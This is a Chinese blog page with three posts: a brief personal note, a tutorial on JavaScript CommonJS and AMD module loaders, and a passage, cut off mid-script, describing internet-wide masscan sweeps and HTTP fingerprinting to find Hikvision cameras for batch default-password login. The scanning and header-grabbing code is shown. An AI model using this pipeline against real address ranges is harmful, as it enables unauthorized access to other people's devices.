<p>想起来百度前端技术学院的网页在我的手机上也是看不到下面的部分，又看了看ovilia姐姐的CV发现我手机都翻不了页就心安理得的干其他事去了(┙&gt;∧&lt;)┙へ┻┻&gt;)</p>
<p>就这样吧。</p>
<p>有兴趣可以看看<a href="http://resume.reverland.org" target="_blank" rel="external">resume.reverland.org</a></p>
<p>其实还是好多不会，不过还真是擅长各种quick and dirty的事情。。。</p>
<p>还有点挺遗憾，明明fontmin在加载时会显示出loading那部分页面，为啥到我这里就不行了。。。原来html结构写错了(´・ω・｀)</p>
<p>而且这完全没内容的简历怎么好意思发出去(╥_╥)</p>
<p>我想也许明天用fontmin制作下需要的字体，补充下中文简历。</p>
<p>另外，给北邮天枢CTF出了两道挺有意思的challenge，用到了web的一些奇葩特性╮(￣▽￣)╭，等比赛完了再放出来。记在这里，我怕比赛完忘了。。。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/javascript/2015/05/02/javascript/" itemprop="url">
                  javascript模块机制原理
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-05-02T00:00:00+08:00" content="2015-05-02">
              2015-05-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/javascript/2015/05/02/javascript/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="javascript/2015/05/02/javascript/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>eloquent javascript是一本浸润着黑客精神和文化的书，上一次看到这样的书还是在三年前，那本书叫land of lisp。</p>
<p>这是关于eloquent js第十章，模块化的一些解释。因为我觉得这部分不好理解。</p>
<h2 id="js模块化基础">js模块化基础</h2><p>我们写代码时，代码总是倾向于越来越像浆糊，越是大的全的功能，越是浆糊到不堪。我们想要看清楚些，就把不同功能分出来，揉成一堆小浆糊，这总比一大团浆糊好处理。</p>
<p>当我们想把一团js浆糊放到一起时，并称之模块时，我们会设计让它提供几个功能，这个一般叫做接口。比如<code>console</code>模块有个<code>log</code>功能，比如等等。</p>
<p>我们可以把这堆浆糊扔到一个全局变量中去，这样其它部分要是想要使用这团浆糊的功能，就使用浆糊提供的接口。比如<code>Math.PI</code>可以访问得到3.14159……。</p>
<p>这很简单，js提供了函数来隔离命名空间，对象来放置模块内容。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod1 = <span class="function"><span class="keyword">function</span> <span class="title">mod1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">3</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;a:<span class="number">1</span>,</span><br><span class="line">            b:print</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
<p>为啥要这样写呢，因为，假如我们不想让人看到局部变量<code>i</code>，函数是我们唯一能借以创建局部作用域的东西。</p>
<p>这就是javascript模块化的基础。</p>
<p>这样，我们想调用某个模块时，就把某个函数包裹着的东西给全局变量，调用者对这个全局变量进行操作就好。</p>
<p><code>return</code>的时候写一大堆对象内容也不合适，我们可以选择传进去个对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod2 = &#123;&#125;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">exports</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">3</span>;</span><br><span class="line">    exports.a = i;</span><br><span class="line">    exports.b = <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x+i);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;(mod2))</span><br></pre></td></tr></table></figure>
<p>但是。。。</p>
<p>当这所有都得需要在全局作用域内进行。</p>
<ol>
<li><p>想想当我们要两个模块a和b都被c依赖，a依赖c0.1版而b依赖c0.2版，a和b中调用名字为c的模块。。。</p>
</li>
<li><p>或者a依赖b然后c依赖d，然而b在a中命名为xx，d在c中也命名为xx。</p>
</li>
</ol>
<p>所以，最好不通过全局作用域实现模块依赖。</p>
<p>但实际上可以做到不需要全局作用域来实现模块的依赖.接下来讨论两种常见的方案。</p>
<h2 id="向CommonJS跃进">向CommonJS跃进</h2><p>写过node程序的人都见过类似的东西</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod3 = <span class="built_in">require</span>(<span class="string">"mod3"</span>);</span><br></pre></td></tr></table></figure>
<p>在该模块中通过require函数引入模块，并通过变量mod3引用这个模块。不需要通过全局变量，该模块高明地引用了其它模块。</p>
<p>require实现方式如下， 通过<code>Function</code>构造函数构造函数实现命名空间, 假设我们有个read函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    code(exports);</span><br><span class="line">    <span class="keyword">return</span> exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样做，每次载入都会运行模块，即使有多个模块载入一个名字的模块也会运行多次。<br>我们加个全局变量保存已经加载的模块。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (modName <span class="keyword">in</span> <span class="built_in">require</span>.cache) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>.cache[modName];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    code(exports);</span><br><span class="line">    <span class="built_in">require</span>.cache[modName] = exports;</span><br><span class="line">    <span class="keyword">return</span> exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在比如你想暴露个和exports对象不同的东西，比如我他妈的只想导出个函数呢，比如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(<span class="string">'fn'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(fn);    <span class="comment">//-&gt; 1</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过额外给模块传递一个叫module的参数，这个参数<code>exports</code>属性默认指向<code>exports</code>对象实现这点。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (modName <span class="keyword">in</span> <span class="built_in">require</span>.cache) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>.cache[modName];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports, module"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = &#123;exports: exports&#125;;</span><br><span class="line">    code(exports, <span class="built_in">module</span>);</span><br><span class="line">    <span class="built_in">require</span>.cache[modName] = <span class="built_in">module</span>.exports;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当模块<code>fn</code>想返回比如1时</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>这样，我们就实现了简单的nodejs模块系统：）Coooooooooooooooool</p>
<p>这有个啥问题呢？浏览器中的js程序执行时，浏览器啥也干不了= =。</p>
<p>read函数没读到模块内容之前，js程序一直执行，但除了等待什么都不干。假如这个read是从网络上读取模块文件，那么万一网络质量很差，这个系统都把大部分时间花在等文件加载上了。</p>
<p>为了解决这个问题，有人发明了<a href="http://browserify.org/" target="_blank" rel="external">browserify</a>.这，看做一个依赖打包服务吧。</p>
<p>另一种方案是：</p>
<h2 id="AMD">AMD</h2><p>这里的AMD不是AMD芯片的AMD，全称叫Asynchronous Module Definition。异步模块定义模块系统。</p>
<p>这个系统的核心，是一个叫做define的函数。</p>
<p>每个模块都必须这样写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">"dep1"</span>, <span class="string">"dep2"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">dep1, dep2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dep1.a + dep2.b;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>假如不依赖其它模块</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define([], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mod = &#123;a: <span class="number">1</span>, b: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"sb"</span>)&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> mod;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这个核心的define函数这么设计，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">depNames, moduleFunction</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//对每个depNames中的依赖，安排异步下载</span></span><br><span class="line">    <span class="comment">//当下载都完成时，执行moduleFunction, 同时把模块接口传给它</span></span><br><span class="line">    <span class="comment">//改变其状态，通知调用者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要实现这个递归的过程，需要一个对象来表示其状态和存放调用者的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defineCache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 指向当前模块的指针</span></span><br><span class="line"><span class="keyword">var</span> currentMod = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getModule</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//如果已经加载过了就返回</span></span><br><span class="line">    <span class="keyword">if</span> (name <span class="keyword">in</span> defineCache)</span><br><span class="line">        <span class="keyword">return</span> defineCache[name];</span><br><span class="line">    <span class="comment">// 否则先返回一个对象</span></span><br><span class="line">    <span class="comment">// 等模块真正下载完后更新currentMod变量，</span></span><br><span class="line">    <span class="comment">// 同时递归执行调用子模块的define函数</span></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = &#123;exports: <span class="literal">null</span>,</span><br><span class="line">        loaded: <span class="literal">false</span>,</span><br><span class="line">        onLoad: []&#125;;</span><br><span class="line">    defineCache[name] = <span class="built_in">module</span>;</span><br><span class="line">    <span class="comment">// 我们假设有这么个异步读取文件的函数</span></span><br><span class="line">    backgroundReadFile(name, <span class="function"><span class="keyword">function</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">            currentMod = <span class="built_in">module</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">""</span>, code)();<span class="comment">// code会是又一个define函数调用</span></span><br><span class="line">            &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">depNames, moduleFunction</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//对每个depNames中的依赖，安排异步下载</span></span><br><span class="line">    <span class="comment">//当下载都完成时，执行moduleFunction, 同时把模块接口传给它</span></span><br><span class="line">    <span class="comment">//改变其状态，通知调用者</span></span><br><span class="line">    <span class="keyword">var</span> myMod = currentMod;</span><br><span class="line">    <span class="keyword">var</span> deps = depNames.map(getModule);</span><br><span class="line"></span><br><span class="line">    deps.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mod</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!mod.loaded)</span><br><span class="line">            <span class="comment">// 如果模块还没加载把父模块的whenDepsLoaded保存</span></span><br><span class="line">            <span class="comment">// 留待该模块完成以后调用</span></span><br><span class="line">            mod.onLoad.push(whenDepsLoaded);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">whenDepsLoaded</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//如果依赖没有全加载好，值得一提的是[].every总是返回真</span></span><br><span class="line">        <span class="keyword">if</span> (!deps.every(<span class="function"><span class="keyword">function</span>(<span class="params">m</span>) </span>&#123; <span class="keyword">return</span> m.loaded; &#125;))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 如果依赖都下载完成，如果deps为[]，args=[]</span></span><br><span class="line">        <span class="keyword">var</span> args = deps.map(<span class="function"><span class="keyword">function</span>(<span class="params">m</span>) </span>&#123; <span class="keyword">return</span> m.exports; &#125;);</span><br><span class="line">        <span class="keyword">var</span> exports = moduleFunction.apply(<span class="literal">null</span>, args);</span><br><span class="line">        <span class="keyword">if</span> (myMod) &#123;    <span class="comment">//对当前模块对象进行更新</span></span><br><span class="line">            myMod.exports = exports;</span><br><span class="line">            <span class="comment">// 更新当前模块状态</span></span><br><span class="line">            myMod.loaded = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//当前模块完成时都会调用一次依赖它的模块们的whenDepsLoaded函数</span></span><br><span class="line">            myMod.onLoad.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123; f(); &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    whenDepsLoaded();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果就是:</p>
<ol>
<li><p>首先调用顶级define，define中所有依赖调用getModule去下载被依赖者代码,被依赖者的代码下载完成后会执行下一个define。</p>
</li>
<li><p>define中getModule会立即返回一个对象，这个对象保存想要加载的被依赖模块的导出接口、是否完成加载信息，和依赖它的模块的whenDepsLoaded函数。</p>
</li>
<li><p>该模块调用其whenDepsLoade函数，该函数在依赖没有全加载完时立即返回。</p>
</li>
<li><p>接下来就等待被依赖模块下载好，被依赖函数又是一个define函数。define函数重复上述过程，</p>
</li>
<li><p>此递归过程继续。直到某个没有依赖的模块</p>
</li>
<li><p>对没有依赖的模块，define中直接调用whenDepsLoaded函数，更新它的导出接口，更新它的加载状态，调用依赖它的模块的whenDepsLoaded函数。(注意js的函数作用域中的myMod)</p>
</li>
<li><p>该whenDepsLoaded函数保存了它自身的模块名和信息。如果它还有其它依赖没加载，立即返回。直到它所有依赖的模块的状态都变了，它的whenDepsLoaded函数才从此真正有了实质作用。把加载好的被依赖模块作为参数，开始真正执行模块代码(之前早就下载好的define的一部分)。之后更新它的导出接口、更新它的加载状态，调用依赖它的模块的whenDepsLoaded函数。</p>
</li>
<li><p>被依赖的模块完成后又重复过程7，不断调用更高级别的依赖者的whenDepsLoaded函数，直到所有的函数都执行完。顶级的define中的whenDepsLoaded执行完。</p>
</li>
</ol>
<p>著名的<a href="http://requirejs.org" target="_blank" rel="external">require.js</a>的设计就是这个原理。</p>
<p>我的逻辑性有点浆糊，但我觉得每种情况都说明白了，没有依赖，依赖其它，不被依赖的模块。</p>
<h2 id="接口设计原则">接口设计原则</h2><ol>
<li>可预测：不总做出乎意料的设计。</li>
<li>组件化：尽可能功能通用，提供简单的数据结构和语法。</li>
<li>分层设计：暴露不同程度的细节。</li>
</ol>
<p>综上，这都是些原理和基本原则。实际会涉及很多复杂的问题。不过，万丈高楼平地起，浮沙之上无高台，基础是深入的前提。而这个前提确是：万事开头难。</p>
<p>感谢看完的读者，希望以后碰到模块化问题都能更轻松迅速解决。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/07/python-spider-camera-find/" itemprop="url">
                  Python Spider: 海康威视摄像头发现
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-07T00:00:00+08:00" content="2015-04-07">
              2015-04-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/07/python-spider-camera-find/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/07/python-spider-camera-find/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)">Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</h2><blockquote>
<p>一切都在不可避免的走向庸俗</p>
<p>王小波</p>
</blockquote>
<p>挖坟= =and 最后一个爬虫。</p>
<p>缘起在去年，一个去某阿里的我并不认识的毕业师兄，这个毕业的师兄好像还写了北邮人ip到地址插件，这个师兄在毕业的时候发了一些列摆一摆贵邮的各种安全问题，其中有个摄像头默认用户名密码。结果呢，我就没登录进去那几个摄像头= =</p>
<p>警告：你所做的一切都是有迹可寻的，dont be evil。</p>
<p>我这里只举摄像头的例子。其实能做的很多，ssh服务器，ftp、数据库等等。如果对web安全漏洞比较熟悉，拿到互联网上批量挖掘都行。。。好像不是在讲爬虫了，不过我觉得爬虫就是爬取信息的工具。</p>
<p>顺便一提，最近分析了下阿里的社会招聘，顺便画了下据此得到的阿里架构图，有兴趣的同学可以一起玩.</p>
<p>大概这么几步：</p>
<ol>
<li>用高效的扫描器扫描大范围地址段，得到开放端口80的ip列表，最好还是随机而不是顺序排列的</li>
<li>对地址大海中聊若晨星般的ip进行http请求，获取服务器信息，保存下来。</li>
<li>找到某种摄像头信息的“基因”(即，这种摄像头必然返回这种信息而其它服务器不会),这里只举一个简单例子</li>
<li>批量获取弱密码摄像头</li>
</ol>
<p>首先，我们需要在unix下工作。。。我们需要辅助工具。我这里说下为什么会使用<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">masscan</a>，因为他比我自己写的扫描器比<a href="https://zmap.io" target="_blank" rel="external">zmap</a>、nmap更快，快很多，虽然它们各有所长。python这里又做起了胶水语言的勾当= =</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">扫描指定端口</span><br><span class="line">usage:</span><br><span class="line">    python scan_port.py net interface port</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> popen2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data/open_port/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.mkdir(<span class="string">'dump'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 扫描网段内80端口, 生成列表</span></span><br><span class="line">cmd = <span class="string">"sudo masscan -i"</span> + sys.argv[<span class="number">2</span>] + \</span><br><span class="line">    <span class="string">" -p "</span> + sys.argv[<span class="number">3</span>] + <span class="string">" --rate 100000 --wait 2 -oL data/open_port/open"</span> + \</span><br><span class="line">    sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp "</span> + \</span><br><span class="line">    sys.argv[<span class="number">1</span>] + <span class="string">" &amp;&amp;\</span><br><span class="line">    cut -f4 -d' ' data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + \</span><br><span class="line">    <span class="string">"_ip.temp &gt; data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.list &amp;&amp;\</span><br><span class="line">    rm -f data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp"</span></span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># cmd = "sudo zmap -i " + sys.argv[2]  + \</span></span><br><span class="line"><span class="comment">#    " -p " + sys.argv[3] + " -o open" + sys.argv[3] + \</span></span><br><span class="line"><span class="comment">#    "_ip.list " + sys.argv[1]</span></span><br><span class="line"></span><br><span class="line">(child_stdout, child_stdin) = popen2.popen2(cmd, bufsize=-<span class="number">1</span>, mode=<span class="string">'t'</span>)</span><br><span class="line"><span class="comment"># 打印输出</span></span><br><span class="line">sys.stdout.write(child_stdout.read())</span><br></pre></td></tr></table></figure>
<p>是不是看上去特别奇葩，我把这种奇(zuo)葩(si)的行事方式叫做quick and dirty式，除了确实能用没有其它优点了(ゝ∀･)</p>
<p>速度很快，这已经到我无线上行的顶峰了，旁边打游戏的同学不要打我ლ(╹◡╹ლ)。喝杯水，看会有爱的<a href="http://eloquentjavascript.net/09_regexp.html" target="_blank" rel="external">eloquent javascript</a>，设定下终端静默时提醒，嗯，好像终端提醒这种神器只有<a href="https://yakuake.kde.org" target="_blank" rel="external">yakuake</a>会有~^_^~</p>
<p><img src="/images/spider/net_scan_1.png" alt=""></p>
<p>我们接下来要处理下这些开放80端口的ip，我们把开放80端口的服务器都模拟请求一次，这样就获得每个ip对应的服务器信息。<a href="https://github.com/robertdavidgraham/masscan/search?utf8=%E2%9C%93&amp;q=HTTP%2FGET+" target="_blank" rel="external">其实这一步我们可以改masscan源码，这样上一步扫描的时候就能把服务器返回信息返回，我们愉快的解析成想要的格式就行</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取server dict</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">20</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/open_port/open80_ip.list'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ips = f.readlines()</span><br><span class="line"></span><br><span class="line">ips = [ip.strip() <span class="keyword">for</span> ip <span class="keyword">in</span> ips]</span><br><span class="line"><span class="comment"># 移除开头和结尾的无关信息</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    